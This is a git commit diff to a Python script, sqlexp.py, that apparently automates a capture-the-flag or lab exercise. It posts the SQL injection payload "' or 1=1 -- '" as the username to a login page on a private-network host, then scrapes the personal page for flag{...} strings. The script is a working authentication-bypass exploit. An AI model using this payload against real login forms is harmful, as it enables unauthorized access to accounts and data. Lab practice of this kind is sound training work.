82343f0fa9770f833e33555fd5e67b913cf2e948
HantaoGG <2543960380@qq.com>
2023-07-27 21:55:22 +0800

    目前来看，完成了所有编写代码的工作

--- bug_script/sqlexp.py
+++ bug_script/sqlexp.py
@@ -6,18 +6,29 @@ from bs4 import BeautifulSoup
 session = requests.Session()
 
 # 发送一个 POST 请求，并自动处理重定向
-response = session.post('http://192.168.157.138:8000/login.php', data={'username': "2112", 'password': 'free'})
-
+response = session.post('http://192.168.157.138:80/login.php', data={'username': "' or 1=1 -- '", 'password': '2'})
+if response.status_code != 200:
+    print('web error!')
+    exit()
 # 打印响应的文本内容
-#print(response.text)
-
+if 'alert' in response.text:
+    pattern = r'alert\("(.+?)"\)'
+    matches = re.findall(pattern, response.text)
+    print(matches)
+    exit()
 # 发送一个 GET 请求，并自动处理重定向
-response = session.get('http://192.168.157.138:8000/personal.php')
+response = session.get('http://192.168.157.138:80/personal.php')
 
+if response.status_code != 200:
+    print('web error!')
+    exit()
+    
 response.encoding = 'utf8'
 outcome = response.text.encode('gbk', 'ignore').decode('gbk')
 soup = BeautifulSoup(outcome, 'html.parser')
+# 查找flag
 flag = None
+count= 0
 for tag in soup.find_all('p', {'class': 'info_show'}):
 
     pattern = r'flag\{[^\}]+\}'
@@ -25,3 +36,7 @@ for tag in soup.find_all('p', {'class': 'info_show'}):
     if(matches):
         for match in matches:
             print(match)
+            count +=1
+            
+if count==0:
+    print("SQL attack failed!")
